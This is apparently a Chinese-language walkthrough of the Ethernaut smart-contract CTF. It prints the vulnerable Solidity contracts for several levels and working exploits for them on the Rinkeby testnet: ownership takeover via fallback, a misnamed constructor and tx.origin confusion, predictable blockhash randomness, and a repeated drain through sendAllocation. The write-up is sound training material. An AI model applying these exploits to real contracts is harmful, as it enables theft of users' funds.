    <content><![CDATA[<p>Solidity基础可以先看这个互动式教程：<a href="https://cryptozombies.io/zh/">https://cryptozombies.io/zh/</a> ，以及<a href="https://solidity-by-example.org/">https://solidity-by-example.org/</a></p>
<p>Ethernaut是一个智能合约漏洞靶场</p>
<p>项目地址：<a href="https://github.com/OpenZeppelin/ethernaut">https://github.com/OpenZeppelin/ethernaut</a></p>
<p>在线靶场：<a href="https://ethernaut.openzeppelin.com/">https://ethernaut.openzeppelin.com</a></p>
<span id="more"></span>

<h2 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h2><p>获取Rinkeby测试网Ether可以到下面两个网站</p>
<p><a href="https://faucets.chain.link/rinkeby">https://faucets.chain.link/rinkeby</a></p>
<p><a href="https://faucet.rinkeby.io/">https://faucet.rinkeby.io/</a></p>
<p>第一关照着提示熟悉下题目操作流程即可</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">info</span>()</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">info1</span>()</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">info2</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">infoNum</span>()</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">info42</span>()</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">theMethodName</span>()</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">method7123949</span>()</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">password</span>()</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">authenticate</span>(<span class="string">&#x27;ethernaut0&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>This level walks you through the very basics of how to play the game.</p>
<p>You will beat this level if</p>
<ol>
<li>you claim ownership of the contract</li>
<li>you reduce its balance to 0</li>
</ol>
<p> Things that might help</p>
<ul>
<li>How to send ether when interacting with an ABI</li>
<li>How to send ether outside of the ABI</li>
<li>Converting to and from wei&#x2F;ether units (see <code>help()</code> command)</li>
<li>Fallback methods</li>
</ul>
<h3 id="Sources"><a href="#Sources" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>构造函数中初始化创建者的贡献值为1000 Ether，可以通过<code>contribute()</code>函数增加自己的贡献值，但由于数量限制不是很可行</p>
<p>合约可以有一个未命名的函数，这个函数不能有参数也不能有返回值，如果在一个到合约的调用中，没有其他函数与给定的函数标识匹配（或没有提供调用数据），那么这个函数（<code>fallback</code>函数）会被执行。除此之外，每当合约收到以太币（没有任何数据），这个函数就会执行。此外，为了接收以太币，<code>fallback</code>函数必须标记为<code>payable</code>。</p>
<p>在<a href="https://learnblockchain.cn/docs/solidity/060-breaking-changes.html?highlight=receive">solidity 0.6.0</a>之后，<code>fallback</code>函数已经被拆分为一个使用 <code>fallback</code> 关键字定义的回退函数 和 使用关键字 <code>receive</code> 定义的接受以太函数。</p>
<ul>
<li>If present, the receive ether function is called whenever the call data is empty (whether or not ether is received). This function is implicitly <code>payable</code>.</li>
<li>The new fallback function is called when no other function matches (if the receive ether function does not exist then this includes calls with empty call data). You can make this function <code>payable</code> or not. If it is not <code>payable</code> then transactions not matching any other function which send value will revert. You should only need to implement the new fallback function if you are following an upgrade or proxy pattern.</li>
</ul>
<p>所以先通过<code>contribute()</code>函数使<code>contributions[msg.sender]</code> &gt; 0，然后直接向合约转账即可让<code>owner</code>变成自己</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>: <span class="title function_">toWei</span>(<span class="string">&quot;0.0001&quot;</span>)&#125;)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">value</span>: <span class="title function_">toWei</span>(<span class="string">&quot;0.001&quot;</span>)&#125;)</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204213024493.png" alt="image-20211204213024493"></p>
<h2 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h2><p>Claim ownership of the contract below to complete this level.</p>
<p> Things that might help</p>
<ul>
<li>Solidity Remix IDE</li>
</ul>
<h3 id="Sources-1"><a href="#Sources-1" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  /* constructor */</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">	        require(</span><br><span class="line">	            msg.sender == owner,</span><br><span class="line">	            &quot;caller is not the owner&quot;</span><br><span class="line">	        );</span><br><span class="line">	        _;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>Solidity 0.4.22 之前的构造函数是和合约同名的（0.4.22及之后都采用constructor(…) {…}来声明构造函数），它只在合约创建时执行一次，题目代码中将<code>function Fallout() public payable</code>书写为<code>function Fal1out() public payable</code>，即变成了一个普通函数，导致可以在外部自由调用，从而改变<code>owner</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title class_">Fal1</span>out();</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204150650577.png" alt="image-20211204150650577"></p>
<p>代码还有另外一个问题，首先<code>allocations[allocator]</code>的值来自用户调用<code>allocate</code>存入的数额， <code>sendAllocation</code> 函数可以向<code>allocator</code>地址转账，金额为<code>allocations[allocator]</code>，但是转账后并未清空<code>allocations[allocator]</code>，导致可以一直让合约账户转账，如下演示</p>
<blockquote>
<p>Ethernaut Player address : 0x169C51C027B82267387429C0E8b47C6879A4Fb5d<br>Contract Instance address : 0xa15Accd5E15Fe52018967adFC702C5Afea6fe9D7<br>Another address : 0xdd7587F01659246E942148b70F2bCeD28aB8bC23</p>
</blockquote>
<p>先调用<code>allocate</code>向合约账户转入一些ETH</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">allocate</span>(&#123;<span class="attr">value</span>: <span class="title function_">toWei</span>(<span class="string">&quot;0.1&quot;</span>)&#125;)</span><br></pre></td></tr></table></figure>

<p>然后通过web3用另一个账户也向合约转账</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Web3</span> = <span class="built_in">require</span>(<span class="string">&#x27;web3&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Tx</span> = <span class="built_in">require</span>(<span class="string">&#x27;ethereumjs-tx&#x27;</span>).<span class="property">Transaction</span></span><br><span class="line"><span class="keyword">const</span> rpcURL = <span class="string">&#x27;&#x27;</span> <span class="comment">// RPC URL</span></span><br><span class="line"><span class="keyword">const</span> web3 = <span class="keyword">new</span> <span class="title class_">Web3</span>(rpcURL)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> abi = [&#123;<span class="string">&quot;inputs&quot;</span>:[],<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Fal1out&quot;</span>,<span class="string">&quot;outputs&quot;</span>:[],<span class="string">&quot;stateMutability&quot;</span>:<span class="string">&quot;payable&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;function&quot;</span>&#125;,&#123;<span class="string">&quot;inputs&quot;</span>:[],<span class="string">&quot;name&quot;</span>:<span class="string">&quot;allocate&quot;</span>,<span class="string">&quot;outputs&quot;</span>:[],<span class="string">&quot;stateMutability&quot;</span>:<span class="string">&quot;payable&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;function&quot;</span>&#125;,&#123;<span class="string">&quot;inputs&quot;</span>:[&#123;<span class="string">&quot;internalType&quot;</span>:<span class="string">&quot;address&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;allocator&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;address&quot;</span>&#125;],<span class="string">&quot;name&quot;</span>:<span class="string">&quot;allocatorBalance&quot;</span>,<span class="string">&quot;outputs&quot;</span>:[&#123;<span class="string">&quot;internalType&quot;</span>:<span class="string">&quot;uint256&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;uint256&quot;</span>&#125;],<span class="string">&quot;stateMutability&quot;</span>:<span class="string">&quot;view&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;function&quot;</span>&#125;,&#123;<span class="string">&quot;inputs&quot;</span>:[],<span class="string">&quot;name&quot;</span>:<span class="string">&quot;collectAllocations&quot;</span>,<span class="string">&quot;outputs&quot;</span>:[],<span class="string">&quot;stateMutability&quot;</span>:<span class="string">&quot;nonpayable&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;function&quot;</span>&#125;,&#123;<span class="string">&quot;inputs&quot;</span>:[],<span class="string">&quot;name&quot;</span>:<span class="string">&quot;owner&quot;</span>,<span class="string">&quot;outputs&quot;</span>:[&#123;<span class="string">&quot;internalType&quot;</span>:<span class="string">&quot;address payable&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;address&quot;</span>&#125;],<span class="string">&quot;stateMutability&quot;</span>:<span class="string">&quot;view&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;function&quot;</span>&#125;,&#123;<span class="string">&quot;inputs&quot;</span>:[&#123;<span class="string">&quot;internalType&quot;</span>:<span class="string">&quot;address payable&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;allocator&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;address&quot;</span>&#125;],<span class="string">&quot;name&quot;</span>:<span class="string">&quot;sendAllocation&quot;</span>,<span class="string">&quot;outputs&quot;</span>:[],<span class="string">&quot;stateMutability&quot;</span>:<span class="string">&quot;nonpayable&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;function&quot;</span>&#125;]</span><br><span class="line"><span class="keyword">const</span> contractAddress = <span class="string">&quot;0xa15Accd5E15Fe52018967adFC702C5Afea6fe9D7&quot;</span> <span class="comment">//合约地址</span></span><br><span class="line"><span class="keyword">const</span> contract = <span class="keyword">new</span> web3.<span class="property">eth</span>.<span class="title class_">Contract</span>(abi, contractAddress)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> account = <span class="string">&#x27;0xdd7587F01659246E942148b70F2bCeD28aB8bC23&#x27;</span></span><br><span class="line"><span class="keyword">const</span> privateKey = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getTransactionCount</span>(account, <span class="function">(<span class="params">err, txCount</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> txObject = &#123;</span><br><span class="line">        <span class="attr">nonce</span>:    web3.<span class="property">utils</span>.<span class="title function_">toHex</span>(txCount),</span><br><span class="line">        <span class="attr">gasLimit</span>: web3.<span class="property">utils</span>.<span class="title function_">toHex</span>(<span class="number">8000000</span>),</span><br><span class="line">        <span class="attr">gasPrice</span>: web3.<span class="property">utils</span>.<span class="title function_">toHex</span>(web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>)),</span><br><span class="line">        <span class="attr">to</span>: contractAddress,</span><br><span class="line">        <span class="attr">data</span>: contract.<span class="property">methods</span>.<span class="title function_">allocate</span>().<span class="title function_">encodeABI</span>(),</span><br><span class="line">        <span class="attr">value</span>: web3.<span class="property">utils</span>.<span class="title function_">toHex</span>(web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">&#x27;0.101&#x27;</span>, <span class="string">&#x27;ether&#x27;</span>)),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> tx = <span class="keyword">new</span> <span class="title class_">Tx</span>(txObject,&#123; <span class="attr">chain</span>: <span class="string">&#x27;rinkeby&#x27;</span>, <span class="attr">hardfork</span>: <span class="string">&#x27;petersburg&#x27;</span> &#125;)</span><br><span class="line">    tx.<span class="title function_">sign</span>(privateKey)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> serializedTx = tx.<span class="title function_">serialize</span>()</span><br><span class="line">    <span class="keyword">const</span> raw = <span class="string">&#x27;0x&#x27;</span> + serializedTx.<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    web3.<span class="property">eth</span>.<span class="title function_">sendSignedTransaction</span>(raw, <span class="function">(<span class="params">err, txHash</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;err:&#x27;</span>, err)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;txHash:&#x27;</span>, txHash)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">contract.<span class="property">methods</span>.<span class="title function_">allocatorBalance</span>(<span class="string">&quot;0x169C51C027B82267387429C0E8b47C6879A4Fb5d&quot;</span>).<span class="title function_">call</span>(<span class="function">(<span class="params">err, result</span>) =&gt;</span> &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(result) &#125;)</span><br><span class="line">contract.<span class="property">methods</span>.<span class="title function_">allocatorBalance</span>(account).<span class="title function_">call</span>(<span class="function">(<span class="params">err, result</span>) =&gt;</span> &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(result) &#125;)</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204162511155.png" alt="image-20211204162511155"></p>
<p>查看<a href="https://rinkeby.etherscan.io/address/0xa15Accd5E15Fe52018967adFC702C5Afea6fe9D7">合约</a>，<code>0x169C51C027B82267387429C0E8b47C6879A4Fb5d</code>转入了两次，共0.101 Ether，<code>0xdd7587F01659246E942148b70F2bCeD28aB8bC23</code>转入了3次，共0.202 Ether，合约账户共0.303 Ether</p>
<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204163212237.png" alt="image-20211204163212237"></p>
<p>调用<code>sendAllocation()</code>3次刚好可将合约账户全部Ether转入<code>0x169C51C027B82267387429C0E8b47C6879A4Fb5d</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendAllocation</span>(<span class="string">&quot;0x169C51C027B82267387429C0E8b47C6879A4Fb5d&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204164548931.png" alt="image-20211204164548931"></p>
<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204164600834.png" alt="image-20211204164600834"></p>
<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204164854035.png" alt="image-20211204164854035"></p>
<h2 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h2><p>This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you’ll need to use your psychic abilities to guess the correct outcome 10 times in a row.</p>
<p> Things that might help</p>
<ul>
<li>See the Help page above, section “Beyond the console”</li>
</ul>
<h3 id="Sources-2"><a href="#Sources-2" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue.div(FACTOR);</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p><code>block.number (uint)</code>：获取当前块高度，<code>sub</code>和<code>div</code>为<code>SafeMath</code>中的方法（减，整除），<code>blockhash(uint blockNumber) returns (bytes32)</code> ：给定块的哈希，仅适用于最近256个块，<code>revert()</code>：中止执行并还原状态更改</p>
<p>代码逻辑为</p>
<ul>
<li>获取上一块的哈希</li>
<li>判断与上一次运行<code>flip</code>函数时得到的哈希是否相同，相同则中止</li>
<li>记录得到的哈希</li>
<li>用得到的哈希整除<code>FACTOR</code>（uint256取值范围为[0,2^256-1]，FACTOR为2^255），结果只会是1或0</li>
<li>以整除的结果作为判断条件</li>
</ul>
<p>代码尝试用<code>blockhash(block.number.sub(1))</code>生成随机数，然而并非随机，其实是可预测的</p>
<p>一个交易是被打包在一个区块里的，通过 <code>Attack</code> 合约去调用 <code>CoinFlip</code> 合约，那么他们的区块信息都是一样的，执行10次<code>exploit()</code>函数即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">abstract contract CoinFlip &#123;</span><br><span class="line">  function flip(bool _guess) virtual public returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    CoinFlip coinFlip = CoinFlip(0x7F0FC6F70B87B7D8C775D065FA706EAC2e6E1A03);</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    function exploit() public returns(bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number-1));</span><br><span class="line">        uint256 flip = blockValue / FACTOR;</span><br><span class="line">        bool side = flip == 1 ? true : false;</span><br><span class="line">        return coinFlip.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204191726341.png" alt="image-20211204191726341"></p>
<p><a href="https://rinkeby.etherscan.io/address/0x7F0FC6F70B87B7D8C775D065FA706EAC2e6E1A03">CoinFlip</a>:</p>
<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204192252584.png" alt="image-20211204192252584"></p>
<p><a href="https://rinkeby.etherscan.io/address/0x0D91AbBA809C7CC50a95E8C9f2c3a52B524b7F14">Attack</a>:</p>
<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204192344309.png" alt="image-20211204192344309"></p>
<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204192357438.png" alt="image-20211204192357438"></p>
<h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><p>Claim ownership of the contract below to complete this level.</p>
<p> Things that might help</p>
<ul>
<li>See the Help page above, section “Beyond the console”</li>
</ul>
<h3 id="Sources-3"><a href="#Sources-3" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3><p><code>tx.origin</code> 是交易的发送方，必然是这个交易的原始发起方，无论中间有多少次合约内&#x2F;跨合约函数调用，而且一定是账户地址而不是合约地址；<code>msg.sender</code> 是消息的发送方，也可以说是函数的直接调用方，在用户手动调用该函数时是发起调用的账户地址，但也可以是调用该函数的一个智能合约的地址</p>
<p>用户可以通过另一个合约 <code>Attack</code> 来调用目标合约中的 <code>changeOwner()</code>，此时，<code>tx.origin</code> 为用户，<code>msg.sender</code> 为 <code>Attack</code>，即可绕过条件，成为 owner</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">abstract contract Telephone &#123;</span><br><span class="line">  function changeOwner(address _owner) virtual public ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Telephone telephone = Telephone(0x4077264AbFd7Dc4c88E78fdD1cf440cfa1994221);</span><br><span class="line"></span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        telephone.changeOwner(0x169C51C027B82267387429C0E8b47C6879A4Fb5d);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部署该合约，调用<code>exploit()</code>即可</p>
<p><a href="https://rinkeby.etherscan.io/address/0x4077264AbFd7Dc4c88E78fdD1cf440cfa1994221#internaltx">Telephone</a>：</p>
<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204220749115.png" alt="image-20211204220749115"></p>
<p><a href="https://rinkeby.etherscan.io/address/0x289d053e0f2A18a6A43a7bC0bE2B8160928E4c36">Attack</a>：</p>
<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204220851923.png" alt="image-20211204220851923"></p>
<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204220904318.png" alt="image-20211204220904318"></p>
<p>将<code>tx.origin</code>与<code>msg.sender</code>混淆可能会导致类似于<a href="https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/">Ethereum Wallet  Frontier</a>的钓鱼攻击</p>
<h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>The goal of this level is for you to hack the basic token contract below.</p>
<p>You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.</p>
<p> Things that might help:</p>
<ul>
<li>What is an odometer?</li>
</ul>
<h3 id="Sources-4"><a href="#Sources-4" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span 